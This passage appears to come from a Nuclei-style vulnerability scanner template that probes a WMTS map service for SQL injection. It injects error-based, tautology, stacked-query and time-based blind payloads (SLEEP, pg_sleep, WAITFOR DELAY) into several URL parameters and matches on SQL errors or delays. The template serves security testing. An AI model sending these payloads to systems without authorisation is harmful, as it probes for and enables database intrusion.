    attack: batteringram
    stop-at-first-match: true

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "syntax error"
        condition: or

  # Test ELEVATION dimension
  - method: GET
    path:
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER={{base_layer}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png&ELEVATION={{payload}}"

    payloads:
      payload:
        - "850'"
        - "850' OR '1'='1"
        - "'; SELECT 1--"

    attack: batteringram
    stop-at-first-match: true

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "syntax error"
        condition: or

  # Test GetFeatureInfo I/J parameters
  - method: GET
    path:
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetFeatureInfo&LAYER={{base_layer}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png&I={{payload}}&J=128&INFOFORMAT=application/json"
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetFeatureInfo&LAYER={{base_layer}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png&I=128&J={{payload}}&INFOFORMAT=application/json"

    payloads:
      payload:
        - "128'"
        - "128 OR 1=1"
        - "'; SELECT 1--"

    attack: batteringram
    stop-at-first-match: true

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "syntax error"
        condition: or

  # Test INFOFORMAT parameter
  - method: GET
    path:
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetFeatureInfo&LAYER={{base_layer}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png&I=128&J=128&INFOFORMAT={{payload}}"

    payloads:
      payload:
        - "application/json'"
        - "' OR '1'='1"
        - "'; SELECT 1--"

    attack: batteringram
    stop-at-first-match: true

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "syntax error"
        condition: or

  # Time-based blind SQLi in LAYER
  - method: GET
    path:
      - "{{BaseURL}}/wmts?SERVICE=WMTS&REQUEST=GetTile&LAYER={{payload}}&STYLE=default&TILEMATRIXSET={{base_tms}}&TILEMATRIX=0&TILEROW=0&TILECOL=0&FORMAT=image/png"

    payloads:
      payload:
        - "{{base_layer}}' AND SLEEP(5)--"
        - "{{base_layer}}' AND pg_sleep(5)--"
        - "{{base_layer}}'; WAITFOR DELAY '0:0:5'--"

    attack: batteringram

    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
